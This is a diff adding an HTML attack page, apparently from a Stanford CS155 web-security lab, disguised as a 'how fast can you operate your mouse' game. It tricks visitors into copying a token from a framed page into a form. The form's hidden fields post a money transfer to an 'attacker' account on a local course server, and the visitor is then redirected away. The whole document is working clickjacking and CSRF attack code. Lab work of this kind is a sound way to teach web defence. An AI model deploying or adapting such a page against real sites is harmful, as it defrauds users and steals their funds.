@@ -1,0 +1,53 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+  <head>
+    <title>How fast can you operate your mouse?</title>
+    <style type="text/css">
+    	body
+    	{
+    		width: 980px;
+    		margin: 0 auto;
+    		position: relative;
+    	}
+    	#srcFrame
+    	{
+    		position: absolute;
+    		width: 280px;
+    		height: 20px;
+    		top: 90px;
+    		left: 0px;
+    		border: none;
+    	}
+    	#destFrame
+    	{
+    		position: absolute;
+    		width: 600px;
+    		height: 400px;
+    		top: 200px;
+    		background-color: #F00;
+
+    	}
+    	form
+    	{
+    		position: absolute;
+    		top: 120px;
+    	}
+	</style>
+  </head>
+  <body>
+    <h1>How fast can you operate your mouse?</h1>
+  	<h3>Copy the following string to the box as soon as possible</h3>
+    <iframe id = "srcFrame" src = "bp2.html" scrolling="no"></iframe>
+    <form name="win" method = "post" action="http://localhost:3000/super_secure_post_transfer" target = "result">
+ 		<input name="destination_username" value="attacker" hidden>
+ 		<input name="quantity" value=10 hidden>
+ 		<input name="tokeninput" size="40" value="">
+ 		<input type="submit" onclick='window.location = "http://crypto.stanford.edu/cs155/";'>
+	</form>
+	<iframe id = "destFrame" name = "result" sandbox = "" hidden></iframe>
+  </body>
+</html>
+
+
